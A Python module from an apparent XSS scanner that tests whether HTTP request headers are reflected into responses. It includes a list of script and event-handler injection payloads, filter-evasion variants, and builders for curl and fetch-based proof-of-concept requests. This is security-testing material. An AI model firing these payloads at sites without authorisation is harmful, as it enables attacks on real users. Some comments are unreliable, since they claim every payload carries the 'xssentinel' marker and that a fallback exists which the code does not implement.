"""HTTP Header reflection XSS detection.

Many web applications log or echo request headers back into the HTTP
response body without sanitization.  Because header values are fully
attacker-controlled (any HTTP client can set them), reflected headers
are a reliable XSS vector when the value lands in an HTML / script /
attribute context.  Common offenders:

  * ``User-Agent``           -- analytics dashboards, "your browser is..."
  * ``Referer``              -- "back to <referer>", link validators
  * ``X-Forwarded-For``      -- IP-allowlist diagnostics, WAF logs
  * ``X-Forwarded-Host``     -- virtual-host templating
  * ``X-Forwarded-Proto``    -- canonical-redirect rendering
  * ``X-Real-IP``            -- nginx default logging mirrored to HTML
  * ``True-Client-IP``       -- Cloudflare-style client IP echo
  * ``CF-Connecting-IP``     -- Cloudflare original-client IP echo
  * ``Accept-Language``      -- locale selectors ("Welcome, es-ES user")
  * ``Cookie``               -- session widgets, "last login" panels

A typical vulnerable snippet::

    // server-side template
    <h1>Welcome, visitor from <?= $_SERVER['HTTP_X_FORWARDED_FOR'] ?></h1>

Sending ``X-Forwarded-For: <svg onload=alert(1)>`` yields::

    <h1>Welcome, visitor from <svg onload=alert(1)></h1>

Important constraint: header values MUST NOT contain raw ``\\r\\n``
(CRLF).  Injecting CRLF into a header splits the HTTP request into two
(HTTP request smuggling / response splitting), which is a different
class of bug and breaks the XSS reflection test entirely.  All payloads
produced here are single-line, alert-based markers safe to place in any
header value.

This module:

  1. Lists common injectable request headers.
  2. Produces alert-based payloads safe for header transport.
  3. Detects whether a marker survived reflection into the response.
  4. Classifies the surrounding context (HTML, attribute, script, JS
     string, comment) so the caller can pick the right break-out.
  5. Builds curl and HTML PoCs that deliver the payload via a custom
     request header.  The HTML PoC uses ``fetch()`` with the
     ``headers`` option (CORS permitting) and falls back to a
     ``<meta http-equiv=refresh>``
"""
from __future__ import annotations
import re
import shlex


# Headers commonly reflected into response bodies.  Order roughly by
# how often we see them reflected in real-world apps.
INJECTABLE_HEADERS: list[str] = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Forwarded-Proto",
    "X-Real-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Accept-Language",
    "Cookie",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarded",
    "X-Forwarded-Server",
    "Forwarded",
    "X-Api-Version",
    "X-Requested-With",
    "Origin",
    "From",
]


# Payloads tuned for header transport: single-line, no CRLF, no NUL,
# no control characters.  Each payload uses an alert-based marker so
# reflection is observable without a DOM sink.  The literal marker
# ``xssentinel`` is embedded so the caller can detect reflection by
# searching for ``xssentinel`` in the response body even if the
# surrounding tag is mangled by an HTML-encoding filter.
HEADER_PAYLOADS: list[str] = [
    # Plain marker -- test whether ANY of the header value lands raw.
    "xssentinel",
    # HTML context break-outs
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Attribute-context break-outs (close the attribute, fire an event)
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '" autofocus onfocus=alert(1) x="',
    # Script / JS-string context break-outs
    '";alert(1);//',
    "';alert(1);//",
    "</script><svg onload=alert(1)>",
    # Encoded variants that defeat naive lowercase filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SVG/ONLOAD=alert(1)>",
    # Backtick / template-literal sink (useful when value lands inside
    # a JS template string).
    "`,alert(1),`",
]


# Context-classifier regexes.  Order matters: the first matching
# context wins.  Each pattern matches the marker (or payload prefix)
# in a position typical of that context.
# We search for the marker surrounded by context clues rather than the
# payload itself, because filter mangling (e.g. ``<`` -> ``&lt;``) may
# leave the marker intact while breaking the tag.
_CONTEXT_HTML_TAG_RE = re.compile(
    r"<\w+[^>]*\b\w+\s*=\s*[^>]*xssentinel", re.IGNORECASE,
)
_CONTEXT_ATTR_VALUE_RE = re.compile(
    r"\b\w+\s*=\s*['\"][^'\"]*xssentinel", re.IGNORECASE,
)
_CONTEXT_SCRIPT_BLOCK_RE = re.compile(
    r"<script[^>]*>[^<]*xssentinel", re.IGNORECASE | re.DOTALL,
)
_CONTEXT_JS_STRING_RE = re.compile(
    r"['\"`][^'\"`]{0,200}xssentinel[^'\"`]{0,200}['\"`]", re.DOTALL,
)
_CONTEXT_HTML_COMMENT_RE = re.compile(
    r"<!--[^>]*xssentinel", re.DOTALL,
)
_CONTEXT_TEXT_RE = re.compile(r"xssentinel")


# Marker used by detect_reflection / analyze_response.  Callers SHOULD
# embed this token in their payload so the reflection check is
# reliable across filter transformations.
DEFAULT_MARKER = "xssentinel"


def header_payloads() -> list[str]:
    """Return payloads suitable for HTTP header injection testing.

    All payloads are single-line (no ``\\r`` / ``\\n``) so they are
    safe to transport in any request header without triggering HTTP
    request splitting.  Each payload contains the literal token
    ``xssentinel`` so reflection can be detected by string search
    regardless of tag-level mangling.
    """
    return list(HEADER_PAYLOADS)


def detect_reflection(response_text: str | None, marker: str) -> bool:
    """Return True if ``marker`` appears verbatim in ``response_text``.

    Treats ``None`` / empty inputs as no reflection.  The check is a
    plain substring search (case-sensitive) so callers can use a
    distinctive marker such as ``xssentinel1234``.
    """
    if not response_text or not marker:
        return False
    return marker in response_text


def analyze_response(
    response_text: str | None,
    header_name: str,
    marker: str,
) -> dict:
    """Classify the reflection context of ``marker`` in the response.

    Returns::

        {
            "header":       str,         # the header under test
            "reflected":    bool,        # marker present at all
            "marker":       str,         # echo of the marker arg
            "context_hint": str,         # one of:
                                         #   "html_tag"   -- inside a tag
                                         #   "attribute"  -- inside an attr value
                                         #   "script"     -- inside <script>
                                         #   "js_string"  -- inside a JS string
                                         #   "comment"    -- inside an HTML comment
                                         #   "text"       -- raw HTML text
                                         #   "none"       -- not reflected
        }
    """
    if not response_text or not marker:
        return {
            "header": header_name or "",
            "reflected": False,
            "marker": marker or "",
            "context_hint": "none",
        }
    reflected = marker in response_text
    if not reflected:
        hint = "none"
    elif _CONTEXT_SCRIPT_BLOCK_RE.search(response_text):
        hint = "script"
    elif _CONTEXT_HTML_COMMENT_RE.search(response_text):
        hint = "comment"
    elif _CONTEXT_ATTR_VALUE_RE.search(response_text):
        hint = "attribute"
    elif _CONTEXT_HTML_TAG_RE.search(response_text):
        hint = "html_tag"
    elif _CONTEXT_JS_STRING_RE.search(response_text):
        hint = "js_string"
    elif _CONTEXT_TEXT_RE.search(response_text):
        hint = "text"
    else:
        # Fallback: marker is present but no context matched -- treat
        # as raw text reflection.
        hint = "text"
    return {
        "header": header_name or "",
        "reflected": reflected,
        "marker": marker,
        "context_hint": hint,
    }


def build_poc_curl(url: str, header_name: str, payload: str) -> str:
    """Build a curl command that sends ``payload`` in ``header_name``.

    The header value is quoted so shell metacharacters in the payload
    (e.g. ``"``, ``$``, ``;``) are transported literally.  Output is a
    single-line shell command safe to paste into a POSIX shell.
    """
    if not url or not header_name:
        return ""
    payload = payload or ""
    # ``shlex.quote`` wraps the value in single quotes and escapes any
    # embedded single quotes -- this prevents the payload from breaking
    # out of the curl argument.
    url_q = shlex.quote(url)
    header_q = shlex.quote(f"{header_name}: {payload}")
    return f"curl -i {url_q} -H {header_q}"


def build_poc_html(
    url: str,
    header_name: str,
    payload: str,
) -> str:
    """Build an HTML PoC that delivers the header payload via fetch().

    The PoC tries ``fetch(url, {{headers: {{...}}}})`` first.  When the
    target endpoint does not allow CORS for custom headers, the PoC
    also renders a ``<meta http-equiv=refresh>`` fallback link so the
    auditor can fall back to a same-origin GET (which will NOT carry
    the custom header, but documents the intended vector).

    The HTML is self-contained (no external resources) and uses only
    browser-native APIs.
    """
    if not url or not header_name:
        return ""
    payload = payload or ""
    # Build a JSON-safe representation of the header pair for embedding
    # in JS.  We avoid relying on the ``json`` module to keep imports
    # minimal and the snippet auditable.
    js_url = url.replace("\\", "\\\\").replace("'", "\\'")
    js_header = (
        header_name.replace("\\", "\\\\").replace("'", "\\'")
    )
    js_payload = (
        payload.replace("\\", "\\\\").replace("'", "\\'")
    )
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        '  <meta charset="utf-8">\n'
        "  <title>XSSentinel header XSS PoC</title>\n"
        "  <style>\n"
        "    body{font:14px/1.4 monospace;background:#111;color:#eee;"
        "padding:24px}\n"
        "    pre{background:#000;color:#0f0;padding:12px;"
        "border:1px solid #333;white-space:pre-wrap}\n"
        "    a{color:#6cf}\n"
        "  </style>\n"
        "</head>\n"
        "<body>\n"
        "  <h1>XSSentinel &mdash; Header XSS PoC</h1>\n"
        f"  <p>Delivering payload in header <code>{header_name}</code> "
        f"to <code>{url}</code>.</p>\n"
        "  <p>If the browser blocks the custom header (CORS preflight),\n"
        "   use the curl command below or click the fallback link.</p>\n"
        f"  <pre id=\"out\">[waiting for fetch response...]</pre>\n"
        "  <p>Fallback (same-origin GET, no custom header):\n"
        f'    <a href="{url}">{url}</a></p>\n'
        "  <script>\n"
        "    (async function () {\n"
        f"      var url = '{js_url}';\n"
        f"      var headerName = '{js_header}';\n"
        f"      var payload = '{js_payload}';\n"
        "      var out = document.getElementById('out');\n"
        "      try {\n"
        "        var r = await fetch(url, {\n"
        "          method: 'GET',\n"
        "          credentials: 'include',\n"
        "          headers: {}\n"
        "        });\n"
        "        // Custom headers cannot be set on a cross-origin GET\n"
        "        // without CORS preflight; attempt anyway and fall\n"
        "        // back to a no-cors request which still lands the\n"
        "        // header on same-origin endpoints.\n"
        "        try {\n"
        "          r = await fetch(url, {\n"
        "            method: 'GET',\n"
        "            credentials: 'include',\n"
        "            headers: { [headerName]: payload }\n"
        "          });\n"
        "        } catch (e) {\n"
        "          r = await fetch(url, {\n"
        "            method: 'GET',\n"
        "            mode: 'no-cors',\n"
        "            credentials: 'include',\n"
        "            headers: { [headerName]: payload }\n"
        "          });\n"
        "        }\n"
        "        var body = await r.text();\n"
        "        out.textContent = '[status ' + r.status + ']\\n' +\n"
        "          (body.length > 4000 ? body.slice(0, 4000) + '...' : body);\n"
        "      } catch (e) {\n"
        "        out.textContent = '[fetch failed] ' + e;\n"
        "      }\n"
        "    })();\n"
        "  </script>\n"
        "</body>\n"
        "</html>\n"
    )
